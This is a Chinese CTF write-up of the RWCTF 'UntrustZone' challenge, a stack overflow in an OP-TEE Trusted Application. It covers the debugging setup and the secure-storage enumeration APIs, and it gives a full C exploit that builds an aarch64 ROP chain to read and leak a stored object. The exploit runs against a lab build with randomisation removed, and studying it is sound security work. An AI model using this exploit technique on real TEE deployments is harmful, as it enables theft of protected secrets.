# RWCTF UntrustZone Wp

## 前言

由于作者水平有限如文中出现语义模糊、语法错误以及技术问题望读者斧正。此篇文章是上一篇 "RWCTF Trust or Not Wp" 的后续，由于不熟悉 arm64 以及 TA Pwn 的细节再加上春节的缘故，所以托了很久才开始写这篇文章，不过好在最后完成了。UntrustZone 与 Turst Or Not 不同之处在于此题需要做题人了解 TA 漏洞的利用方法，以及安全存储函数的调用过程。

## TEE

有关 TEE 和 TA 的知识就不重复的赘述了，若读者仍不了解 TEE 与 TA 相关的内容请翻看前一篇文章，前一篇文章中对 TEE 和 TA 进行了一个简短的描述。

## 调试技巧

既然是道 Pwn 题那么调试是必不可少的，但是在闭源的情况下想要调试 TEE 还是有些困难的，因为 TEE 算是和 REE 并行运行的一个系统，所以无法使用 gdb 等调试工具。既然无法使用现有的调试方法，我们就需要想一些其他的办法。

首先阅读文档，文档中说明在有源码时是可以对其进行调试的，但是我们并没有源码。但是在我用文档中的方法运行 TEE 时，我发现在真正启动系统前会打开两个窗口，这两个窗口分别监听两个端口，在 TEE 真正运行之后分别作为 REE 和 TEE 的输入输出。在 TEE 的输出中会包含很多信息，比如加载了哪个 TA 以及 crash 点的上下文信息。那么通过这个上下文信息我们也就可以获得寄存器的值以及程序的内存分配情况。

以下内容是 TEE 在运行 TA 遇到 crash 时打印的输出。 

```shell
REE Output:

bash# exp
[*] Pwned by Resery
TEEC_InvokeCommand failed: 0x63777200

TEE Output:

D/TC:0 0 abort_handler:531 [abort] abort in User mode (TA will panic)
E/TC:? 0 
E/TC:? 0 User mode prefetch-abort at address 0x0 (translation fault)
E/TC:? 0  esr 0x82000005  ttbr0 0x200000e191000   ttbr1 0x00000000   cidr 0x0
E/TC:? 0  cpu #0          cpsr 0x40000100
E/TC:? 0  x0  0000000000000000 x1  00000000f0100001
E/TC:? 0  x2  0000000000000040 x3  0000000040032328
E/TC:? 0  x4  00000000400322ec x5  0000000000000000
E/TC:? 0  x6  ffffffffffffffff x7  0000000040033000
E/TC:? 0  x8  0000000000000032 x9  0000000040029540
E/TC:? 0  x10 0000000000000000 x11 0000000000000000
E/TC:? 0  x12 0000000000000000 x13 0000000040032f80
E/TC:? 0  x14 0000000000000000 x15 0000000000000000
E/TC:? 0  x16 000000000e10ef44 x17 0000000000000000
E/TC:? 0  x18 0000000000000000 x19 0000000000000000
E/TC:? 0  x20 2020202020202020 x21 2121212121212121
E/TC:? 0  x22 2222222222222222 x23 2323232323232323
E/TC:? 0  x24 2424242424242424 x25 2525252525252525
E/TC:? 0  x26 2626262626262626 x27 2727272727272727
E/TC:? 0  x28 2828282828282828 x29 0000000000000000
E/TC:? 0  x30 0000000000000000 elr 0000000000000000
E/TC:? 0  sp_el0 0000000040032350
E/LD:  Status of TA b6c53aba-9669-4668-a7f2-205629d00f86
E/LD:   arch: aarch64
E/LD:  region  0: va 0x40004000 pa 0x0e300000 size 0x002000 flags rw-s (ldelf)
E/LD:  region  1: va 0x40006000 pa 0x0e302000 size 0x008000 flags r-xs (ldelf)
E/LD:  region  2: va 0x4000e000 pa 0x0e30a000 size 0x001000 flags rw-s (ldelf)
E/LD:  region  3: va 0x4000f000 pa 0x0e30b000 size 0x004000 flags rw-s (ldelf)
E/LD:  region  4: va 0x40013000 pa 0x0e30f000 size 0x001000 flags r--s
E/LD:  region  5: va 0x40014000 pa 0x00001000 size 0x012000 flags r-xs [0]
E/LD:  region  6: va 0x40026000 pa 0x00013000 size 0x00c000 flags rw-s [0]
E/LD:  region  7: va 0x40032000 pa 0x0e32e000 size 0x001000 flags rw-s (stack)
E/LD:  region  8: va 0x40033000 pa 0x74b782b0 size 0x005000 flags rw-- (param)
E/LD:  region  9: va 0x40038000 pa 0x74b738f8 size 0x001000 flags rw-- (param)
E/LD:   [0] b6c53aba-9669-4668-a7f2-205629d00f86 @ 0x40014000
E/LD:  Call stack:
E/LD:   0x00000000
D/TC:? 0 user_ta_enter:176 tee_user_ta_enter: TA panicked with code 0xdeadbeef
D/TC:? 0 destroy_ta_ctx_from_session:324 Remove references to context (0xe17f7a8)
D/TC:? 0 destroy_context:308 Destroy TA ctx (0xe17f790)
D/TC:? 0 tee_ta_close_session:512 csess 0xe17f7f0 id 1
D/TC:? 0 tee_ta_close_session:531 Destroy session

```

为了方便我修改了启动脚本，修改后的脚本内容如下所示：

```shell
#!/bin/sh

qemu-system-aarch64 \
	-nographic \
        -serial tcp:localhost:54320 \
        -serial tcp:localhost:54321 \
	-smp 2 \
	-machine virt,secure=on,gic-version=3,virtualization=false \
	-cpu cortex-a57 \
	-d unimp -semihosting-config enable=on,target=native \
	-m 1024 \
	-bios bl1.bin \
	-initrd ./rootfs/hacked.cpio \
	-kernel Image -no-acpi \
	-append console="ttyAMA0,38400 keep_bootcon root=/dev/vda2  -object rng-random,filename=/dev/urandom,id=rng0 -device virtio-rng-pci,rng=rng0,max-bytes=1024,period=1000" \
	-no-reboot \
	-monitor stdio
        -s -S
```

注意一定要开启 qemu 的 monitor ，如果没开启的话就只能通过 kill 来让 TEE 停止运行。

## 漏洞分析

首先根据 TEE 的输出可以知道题目使用的 OPTEE 的版本，然后我下载了对应版本的 OPTEE ，制作了个 sig 文件用来恢复符号表。

得到 InvokeCommandEntryPoint 函数的代码，至于怎么判断的这个函数为 InvokeCommandEntryPoint 我是通过搜 TA 的 UUID 发现题目中的 TA 只是在已有 TA 上添加了一些代码。通过对比逆向出来的代码中的报错输出与现有 TA 中报错的输出即可确定当前函数为 InvokeCommandEntryPoint 。

出题人并没有把漏洞设置的太难，就是一个很简单的栈溢出，因为第二、三个参数皆由用户可控所以可以溢出任意长度。

```C
__int64 __fastcall sub_12C(__int64 session, int command, int params_types, TEE_Param *params)
{
  uint32_t size; // w21
  __int64 obj_id; // x0
  __int64 obj_id_; // x20
  unsigned int v8; // w0
  unsigned int v9; // w19
  unsigned int v11; // w0
  __int64 obj; // [xsp+48h] [xbp+48h] BYREF
  __int64 data[4]; // [xsp+50h] [xbp+50h] BYREF

  if ( command )
    return 0xFFFF0006;
  memset(data, 0, sizeof(data));
  if ( params_types != 85 )
  {
    return 0xFFFF0006;
  }
  else
  {
    size = params->memref.size;
    obj_id = TEE_Malloc(size);
    obj_id_ = obj_id;
    if ( obj_id )
    {
      TEE_MemMove(obj_id, params->memref.buffer, size);
      TEE_MemMove(data, params[1].memref.buffer, params[1].memref.size);  <------------ bug
      v8 = TEE_CreatePersistentObject(1LL, obj_id_, size, 1031LL, 0LL, 0LL, 0LL, &obj);
      v9 = v8;
      if ( v8 )
      {
        EMSG("random_number_generate", 114LL, 1LL, 1LL, "TEE_CreatePersistentObject failed 0x%08x", v8);
      }
      else
      {
        v11 = TEE_WriteObjectData(obj, data, 32LL);
        v9 = v11;
        if ( v11 )
        {
          EMSG("random_number_generate", 121LL, 1LL, 1LL, "TEE_WriteObjectData failed 0x%08x", v11);
          TEE_CloseAndDeletePersistentObject1(obj);
        }
        else
        {
          TEE_CloseObject(obj);
        }
      }
      TEE_Free(obj_id_);
    }
    else
    {
      return 0xFFFF000C;
    }
  }
  return v9;
}
```

## Exp 编写/编译/上传

通过文档可以知道 OPTEE 其实提供了示例 CA 与 TA ，以便开发人员学习如何编写 CA 与 TA 。OPTEE 有一个 hello_world 示例，于是我就偷懒修改了示例中原本对应的 TA 的 UUID 为漏洞 TA 的 UUID ，然后修改了下传递的参数，这样我就拥有了 EXP CA 。

在有了 EXP CA 之后就是编译了，我在这里同样偷了个懒，直接利用 OPTEE 的编译规则进行编译，不过 OPTEE 3.15.0 不支持单独编译示例（通过修改 Makefile 可以做到单独编译，但是因为懒就没有改了），所以我在编译的时候就是直接再将整个 OPTEE 重新编译一遍，再将编译后的结果 push 到 REE 里面。这个方法帮我省了很多工作量，但是同样因为每次都需要编译整个 TEE 所以编译的速度很慢，不过好在有 ccache ，在 ccache 的辅助下每次编译需要 5-6 秒左右，不过也还在可以接受的范围之内。

上传 EXP CA 我使用了最传统的方法，把文件系统解压，然后将 EXP CA 放进去，再重新打包，指定 qemu 使用重新打包的文件系统。

因为 EXP CA 需要多次上传，所以写了个超级简单的脚本来让手指能歇一歇。

```shell
echo "Copying exp to /usr/bin"
cp /path/of/your/OPTEE-3.15.0/out-br/build/optee_examples_ext-1.0/hello_world/optee_example_hello_world ./usr/bin/exp
echo "Makeing the rootfs"
find . | cpio -o --format=newc > ./hacked.cpio
```

上传之后直接运行 exp 就可以调用 EXP CA 了。

## RopChain 构造

由于 TA 有地址随机化机制，但是我个人复现的目的不在于怎么绕过随机化，所以我将原本有随机化的 bl32_extern.bin 替换成了无随机化版本的。

不过在构造 rop chain 前，我们需要确定如何才能读取到安全存储的文件中的内容。所以我们继续从文档入手，但是文档中 Secure storage 小节中并没有什么有价值的信息，不过在 Secure storage 小节的末尾提供了两个链接用以获取更多的信息，在其中的一个链接中指出 OPTEE 有安全存储相关的示例代码。

示例代码仓库地址： https://github.com/linaro-swg/optee_examples

示例代码如下：

```C
...

static TEE_Result read_raw_object(uint32_t param_types, TEE_Param params[4])
{
	const uint32_t exp_param_types =
		TEE_PARAM_TYPES(TEE_PARAM_TYPE_MEMREF_INPUT,
				TEE_PARAM_TYPE_MEMREF_OUTPUT,
				TEE_PARAM_TYPE_NONE,
				TEE_PARAM_TYPE_NONE);
	TEE_ObjectHandle object;
	TEE_ObjectInfo object_info;
	TEE_Result res;
	uint32_t read_bytes;
	char *obj_id;
	size_t obj_id_sz;
	char *data;
	size_t data_sz;

	/*
	 * Safely get the invocation parameters
	 */
	if (param_types != exp_param_types)
		return TEE_ERROR_BAD_PARAMETERS;

	obj_id_sz = params[0].memref.size;
	obj_id = TEE_Malloc(obj_id_sz, 0);
	if (!obj_id)
		return TEE_ERROR_OUT_OF_MEMORY;

	TEE_MemMove(obj_id, params[0].memref.buffer, obj_id_sz);

	data_sz = params[1].memref.size;
	data = TEE_Malloc(data_sz, 0);
	if (!data)
		return TEE_ERROR_OUT_OF_MEMORY;

	/*
	 * Check the object exist and can be dumped into output buffer
	 * then dump it.
	 */
	res = TEE_OpenPersistentObject(TEE_STORAGE_PRIVATE,
					obj_id, obj_id_sz,
					TEE_DATA_FLAG_ACCESS_READ |
					TEE_DATA_FLAG_SHARE_READ,
					&object);
	if (res != TEE_SUCCESS) {
		EMSG("Failed to open persistent object, res=0x%08x", res);
		TEE_Free(obj_id);
		TEE_Free(data);
		return res;
	}

	res = TEE_GetObjectInfo1(object, &object_info);
	if (res != TEE_SUCCESS) {
		EMSG("Failed to create persistent object, res=0x%08x", res);
		goto exit;
	}

	if (object_info.dataSize > data_sz) {
		/*
		 * Provided buffer is too short.
		 * Return the expected size together with status "short buffer"
		 */
		params[1].memref.size = object_info.dataSize;
		res = TEE_ERROR_SHORT_BUFFER;
		goto exit;
	}

	res = TEE_ReadObjectData(object, data, object_info.dataSize,
				 &read_bytes);
	if (res == TEE_SUCCESS)
		TEE_MemMove(params[1].memref.buffer, data, read_bytes);
	if (res != TEE_SUCCESS || read_bytes != object_info.dataSize) {
		EMSG("TEE_ReadObjectData failed 0x%08x, read %" PRIu32 " over %u",
				res, read_bytes, object_info.dataSize);
		goto exit;
	}

	/* Return the number of byte effectively filled */
	params[1].memref.size = read_bytes;
exit:
	TEE_CloseObject(object);
	TEE_Free(obj_id);
	TEE_Free(data);
	return res;
}

...

```

虽然我们有了示例代码，但是示例代码中是在已知 obj 的情况下进行的读取操作，然而我们并没有 obj id ，所以需要想一些其他方法来获取 obj 。

不幸的是文档中并没有说明如何获取 obj ，所以我转而去读 GP 规范的文档，GP 文档中规定了 TEE 所需要实现的 API ，在文档中我注意到参数如果是同时作为输入输出的话那么会被特殊的标识一下。在发现标识之后，我翻看了与 Secure storage 有关的所有的 api ，然后找到了这个函数 TEE_GetNextPersistentObject ，该函数会输出 obj ，在通过函数的 Description 得知该函数利用枚举获取 object 并且会返回 object 中诸如类型，大小，标识符等信息。由此可以确定通过该函数可以获取到 obj 。

```C
TEE_Result TEE_GetNextPersistentObject( 
                                   TEE_ObjectEnumHandle      objectEnumerator, 
    [out]                          TEE_ObjectInfo*           objectInfo, 
    [out]                          void*                     objectID, 
    [out]                          size_t*                   objectIDLen );

Description 

The  TEE_GetNextPersistentObject  function  gets  the  next  object  in  an  enumeration  and  returns 
information about the object: type, size, identifier, etc. 
If there are no more objects in the enumeration or if there is no enumeration started, then the function returns 
TEE_ERROR_ITEM_NOT_FOUND. 
If while enumerating objects a corrupt object is detected, then its object ID SHALL be returned in objectID, 
objectInfo SHALL be zeroed, and the function SHALL return TEE_ERROR_CORRUPT_OBJECT.
```

现在可以获取 obj 了，是不是就可以构造 rop chain 了，答案是 No ，虽然我们现在可以获取 obj 了，但是 TEE_GetNextPersistentObject 的第一个参数我们仍然无法获取，不过根据参数的名字和类型，可以大致推断出这个函数的功能类似于迭代器，可以利用他枚举所有的 obj ，所以我们现在就需要继续寻找获取这个 EnumHandle 的 API 。之后发现了这个函数 TEE_AllocatePersistentObjectEnumerator ，根据参数可以得知该函数会输出一个 TEE_ObjectEnumHandle 类型的指针，所以通过这个函数我们就可以获取到一个 EnumHandle 。

```C
TEE_Result TEE_AllocatePersistentObjectEnumerator( 
       [out] TEE_ObjectEnumHandle* objectEnumerator ); 

Description 

The TEE_AllocatePersistentObjectEnumerator function allocates a handle on an object enumerator. 
Once an object enumerator handle has been allocated, it can be reused for multiple enumerations. 
```

经过上面的分析我们已经解决掉了所有的限制条件，也就意味着我们弄清楚了读取安全存储文件相应的函数调用流程，对应的调用流程如下：

1. TEE_AllocatePersistentObjectEnumerator
2. TEE_GetNextPersistentObject
3. TEE_OpenPersistentObject
4. TEE_ReadObjectData

现在知道调用流程了之后，就是需要构造 rop chain 了，由于之前没有了解过在 aarch64 下如何构造 rop chain ，所以在这一步卡住了很久，后面翻看了 cts 的 wp 以及这篇[文章](https://blog.perfect.blue/ROPing-on-Aarch64)学习了一下如何构造 rop chain 。

关于 gadget 我并没有采取 swing 使用的方法，swing 通过 ldelf 寻找 gadget ，通过 ldelf 寻找 gadget 的好处就是地址固定，不过我通过 patch bl32_extern.bin 去除了地址随机化，所以就直接从 TA 中寻找 gadget 了。

关于具体如何构造 rop chain 我就不准备再赘述了，我这里准备简单说一下我在构造 rop chain 时所遇到的问题。

First gadget （一个极其弱智的问题，但是困扰了我好久）
 - aarch64 和 x86 修改返回地址的方法不一样，aarch64 会将返回地址存在栈顶，而我们栈溢出不能覆盖栈顶的内容，所以说我们第一次栈溢出修改的返回地址是调用函数的返回地址，所以我们第一条 gadget 存储的位置应该根据调用函数的最后一条指令来判断

完整 exp 如下(exp 的编写参考了 cts 的 wp)：

```C
/*
 * Copyright (c) 2016, Linaro Limited
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice,
 * this list of conditions and the following disclaimer.
 *
 * 2. Redistributions in binary form must reproduce the above copyright notice,
 * this list of conditions and the following disclaimer in the documentation
 * and/or other materials provided with the distribution.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
 * AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE
 * LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
 * CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
 * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
 * INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
 * CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
 * ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
 * POSSIBILITY OF SUCH DAMAGE.
 */

#include <err.h>
#include <stdio.h>
#include <string.h>

/* OP-TEE TEE client API (built by optee_client) */
#include <tee_client_api.h>

/* For the UUID (found in the TA's h-file(s)) */
#include <hello_world_ta.h>

#define TA_EXP_UUID { 0xb6c53aba, 0x9669, 0x4668, \
		{ 0xa7, 0xf2, 0x20, 0x56, 0x29, 0xd0, 0x0f, 0x86} }

#define TA_BUG_CMD_ID 0

int main(void)
{
	TEEC_Result res;
	TEEC_Context ctx;
	TEEC_Session sess;
	TEEC_Operation op;
	TEEC_UUID uuid = TA_EXP_UUID;
	uint32_t err_origin;

	/* Resery Patched */
	puts("[*] Pwned by Resery");

	res = TEEC_InitializeContext(NULL, &ctx);
	if (res != TEEC_SUCCESS)
		errx(1, "TEEC_InitializeContext failed with code 0x%x", res);

	res = TEEC_OpenSession(&ctx, &sess, &uuid,
			       TEEC_LOGIN_PUBLIC, NULL, NULL, &err_origin);
	if (res != TEEC_SUCCESS)
		errx(1, "TEEC_Opensession failed with code 0x%x origin 0x%x",
			res, err_origin);

	memset(&op, 0, sizeof(op));

	/* Pwn Code */
	op.paramTypes = 0x55;

	uint64_t * payload = calloc(0x4000, 1);
	
	uint64_t text_base = 0x40014000;
	uint64_t stack_base = 0x40032000;
	uint64_t overflow = 0x20 / 8;
	uint64_t sp_offset = overflow;
	uint64_t ret_offset = sp_offset + 1; // sp + 8

	/* Original Data */
	memset(payload, 0xA, 0x20);

	/* True Payload */
	// First gadget is 0x34fc: ldp x29, x30, [sp], #0x90; ret;
	*(payload + sp_offset) = 0x2929292929292929;
	*(payload + ret_offset) = text_base + 0x20dc;

	sp_offset += 0x90 / 8;

	// 0x20dc: ldp x29, x30, [sp], #0x60; ret
	// Following code is to set x19, x20, x29, x30(PC pointer)
	*(payload + sp_offset) = 0x2929292929292929;
	*(payload + sp_offset + 1) = text_base + 0x13c0; // next pc

	sp_offset += 0x60 / 8;

	// 0x13c0: ldr x19, [sp, #0x10]; ldp x29, x30, [sp], #0x20; ret;
	// Following code is to set x29, x30(PC pointer)
	*(payload + sp_offset) = 0x2929292929292929;
	*(payload + sp_offset + 1) = text_base + 0x9e20;
	*(payload + sp_offset + 2) = stack_base;

	sp_offset += 0x20 / 8;

	// 0x9e20: ldp x21, x22, [sp, #0x20]; ldp x23, x24, [sp, #0x30]; ldp x25, x26, [sp, #0x40]; ldp x27, x28, [sp, #0x50]; ldp x29, x30, [sp], #0x60; ret
	// Following code is to set x21, x22, x23, x24, x25, x26, x27, x28, x29, x30(PC pointer)
	*(payload + sp_offset) = 0x2929292929292929;
	*(payload + sp_offset + 1) = text_base + 0x42c4;
	*(payload + sp_offset + 4) = 0x1000;
	*(payload + sp_offset + 5) = stack_base + 0x1070; 
	*(payload + sp_offset + 6) = stack_base;
	*(payload + sp_offset + 7) = 0x2424242424242424;
	*(payload + sp_offset + 8) = 0x2525252525252525;
	*(payload + sp_offset + 9) = 0x2626262626262626;
	*(payload + sp_offset + 10) = text_base + 0xB580;
	*(payload + sp_offset + 11) = 0x2828282828282828;
	
	sp_offset += 0x60 / 8;

	*(payload + sp_offset) = stack_base;
	*(payload + sp_offset + 1) = text_base + 0x20c8;
	*(payload + sp_offset + 2) = 0x1919191919191919;
	*(payload + sp_offset + 3) = 0x2020202020202020;

	sp_offset += 0x20 / 8;

	*(payload + sp_offset) = 0x2929292929292929;
	*(payload + sp_offset + 1) = text_base + 0x1a64;
	*(payload + sp_offset + 2) = 0x1919191919191919;
	*(payload + sp_offset + 3) = 0x0;
	*(payload + sp_offset + 4) = 0x2121212121212121;
	*(payload + sp_offset + 5) = 0x2222222222222222;
	*(payload + sp_offset + 6) = 0x2323232323232323;

	sp_offset += 0x60 / 8;

	*(payload + sp_offset) = 0x2929292929292929;
	*(payload + sp_offset + 1) = text_base + 0x25cc;
	*(payload + sp_offset + 2) = 0x1919191919191919;
	*(payload + sp_offset + 3) = stack_base + 0xe0;

	sp_offset += 0x20 / 8;

	*(payload + sp_offset) = 0x2929292929292929;
	*(payload + sp_offset + 1) = text_base + 0x9e20;
	*(payload + sp_offset + 2) = 0x1919191919191919;
	*(payload + sp_offset + 3) = 0x2020202020202020;

	sp_offset += 0x30 / 8;

	*(payload + sp_offset) = 0x2929292929292929;
	*(payload + sp_offset + 1) = text_base + 0x42c4;
	*(payload + sp_offset + 4) = 0x2121212121212121;
	*(payload + sp_offset + 5) = 0x1;
	*(payload + sp_offset + 6) = 0xaaaaaaaaaaaaaaaa;
	*(payload + sp_offset + 7) = 0x2424242424242424;
	*(payload + sp_offset + 8) = 0x2525252525252525;
	*(payload + sp_offset + 9) = 0x2626262626262626;
	*(payload + sp_offset + 10) = text_base + 0x2670;
	*(payload + sp_offset + 11) = 0x2828282828282828;

	sp_offset += 0x60 / 8;

	*(payload + sp_offset) = 0x2929292929292929;
	*(payload + sp_offset + 1) = text_base + 0x1a64;
	*(payload + sp_offset + 2) = 0x1919191919191919;

	sp_offset += 0x20 / 8;

	*(payload + sp_offset) = 0x2929292929292929;
	*(payload + sp_offset + 1) = text_base + 0x9e2c;
	*(payload + sp_offset + 2) = 0x0;
	*(payload + sp_offset + 3) = stack_base + 0x268;

	sp_offset += 0x20 / 8;

	*(payload + sp_offset) = 0x2929292929292929;
	*(payload + sp_offset + 1) = text_base + 0x2128;
	*(payload + sp_offset + 10) = text_base + 0x26c8;
	*(payload + sp_offset + 11) = 0x2828282828282828;

	sp_offset += 0x60 / 8;

	*(payload + sp_offset) = 0x2929292929292929;
	*(payload + sp_offset + 1) = text_base + 0x42c4;
	*(payload + sp_offset + 4) = stack_base + 0x8;
	*(payload + sp_offset + 5) = 0x0;

	sp_offset += 0x30 / 8;

	*(payload + sp_offset) = 0x2929292929292929;
	*(payload + sp_offset + 1) = text_base + 0x9e1c;

	sp_offset += 0x60 / 8;

	*(payload + sp_offset) = 0x2929292929292929;
	*(payload + sp_offset + 1) = text_base + 0x2358;
	*(payload + sp_offset + 2) = stack_base + 0x8;
	*(payload + sp_offset + 3) = stack_base + 0x2b0;
	*(payload + sp_offset + 4) = 0x1;
	*(payload + sp_offset + 5) = 0x0;
	*(payload + sp_offset + 6) = 0x11;
	*(payload + sp_offset + 7) = 0x2424242424242424;
	*(payload + sp_offset + 8) = 0x2525252525252525;
	*(payload + sp_offset + 9) = 0x2626262626262626;
	*(payload + sp_offset + 10) = 0x2727272727272727;
	*(payload + sp_offset + 11) = 0x2828282828282828;

	sp_offset += 0x60 / 8;

	*(payload + sp_offset) = 0x2929292929292929;
	*(payload + sp_offset + 1) = text_base + 0x2798;
	*(payload + sp_offset + 2) = 0x1919191919191919;
	*(payload + sp_offset + 3) = stack_base + 0x360;
	*(payload + sp_offset + 4) = stack_base + 0x8 + 0x9 + 0x4 + 0x4 + 0x4; // Use panic to dispaly the flag
	*(payload + sp_offset + 5) = 0x40;
	*(payload + sp_offset + 6) = 0x2323232323232323;

	sp_offset += 0x50 / 8;

	*(payload + sp_offset) = 0x2929292929292929;
	*(payload + sp_offset + 1) = text_base + 0x13c0;
	*(payload + sp_offset + 2) = 0x1919191919191919;
	*(payload + sp_offset + 3) = 0x2020202020202020;
	*(payload + sp_offset + 4) = 0x2121212121212121;
	*(payload + sp_offset + 5) = 0x2222222222222222;

	sp_offset += 0x40 / 8;

	*(payload + sp_offset) = 0x2929292929292929;
	*(payload + sp_offset + 1) = text_base + 0x9e20;
	*(payload + sp_offset + 2) = stack_base;

	sp_offset += 0x20 / 8;

	*(payload + sp_offset) = 0x2929292929292929;
	*(payload + sp_offset + 1) = text_base + 0x42c4;
	*(payload + sp_offset + 4) = 50;
	*(payload + sp_offset + 5) = stack_base + 0x8 + 0x9 + 0x4 * 3;
	*(payload + sp_offset + 6) = stack_base + 0x12b0;
	*(payload + sp_offset + 7) = 0x2424242424242424;
	*(payload + sp_offset + 8) = 0x2525252525252525;
	*(payload + sp_offset + 9) = 0x2626262626262626;
	*(payload + sp_offset + 10) = text_base + 0xb580;
	*(payload + sp_offset + 11) = 0x2828282828282828;

	sp_offset += 0x60 / 8;

	*(payload + sp_offset) = stack_base;
	*(payload + sp_offset + 1) = text_base + 0x2d38;
	*(payload + sp_offset + 2) = 0x1919191919191919;
	*(payload + sp_offset + 3) = 0x2020202020202020;

	sp_offset += 0x20 / 8;

	/* Resery Fake Inputs! */

	char obj_id[] = "aaaaaaaa";

	op.paramTypes = TEEC_PARAM_TYPES(TEEC_MEMREF_TEMP_INPUT, TEEC_MEMREF_TEMP_INPUT, TEEC_NONE, TEEC_NONE);
	op.params[0].tmpref.buffer = obj_id;
	op.params[0].tmpref.size = sizeof(obj_id);
	op.params[1].tmpref.buffer = payload;
	op.params[1].tmpref.size = 0x4000;

	/* Let's invoke the bugs! */
	res = TEEC_InvokeCommand(&sess, TA_BUG_CMD_ID, &op,
				 &err_origin);

	if (res != TEEC_SUCCESS) {
		printf("TEEC_InvokeCommand failed: 0x%x\n", res);
	}

	// flag 72776374667b746869735f69735f66616b655f666c61677d
	// rwctf{this_is_fake_flag}

	TEEC_CloseSession(&sess);
	TEEC_FinalizeContext(&ctx);

	return 0;
}
```

## 总结

通过这道题不仅学到了 TA Pwn 的利用方法，同时也学习到了 aarch64 下 ropchain 链的构造方法。能成功复现这道题目也还需要感谢 cts 的耐心指导以及他非常完善的 wp 。至此 RWCTF 中与 TEE 有关的题目就已经全部复现完了，如果精力足够的话之后准备再复现一下 HSO(I think hso is the best challenge of clone-and-pwn) ，不过还都待定 XD 。

## 参考链接

https://github.com/perfectblue/ctf-writeups/tree/master/2022/realworld-ctf-2022/untrustZone

https://bestwing.me/RWCTF-4th-TrustZone-challenge-Writeup.html#UnTrustZone

https://github.com/OP-TEE/optee_os/blob/203ee23d005b2cec2f21b5de334c5a246be32599/lib/libutee/tee_api_objects.c

https://github.com/OP-TEE/optee_os/blob/master/lib/libutee/arch/arm/utee_syscalls_asm.S

https://github.com/OP-TEE/optee_os/blob/6d2f7cf2c8e04bf79411978fd8d82e769ba52c78/core/tee/tee_svc_storage.c

https://optee.readthedocs.io/en/latest/

https://blog.perfect.blue/ROPing-on-Aarch64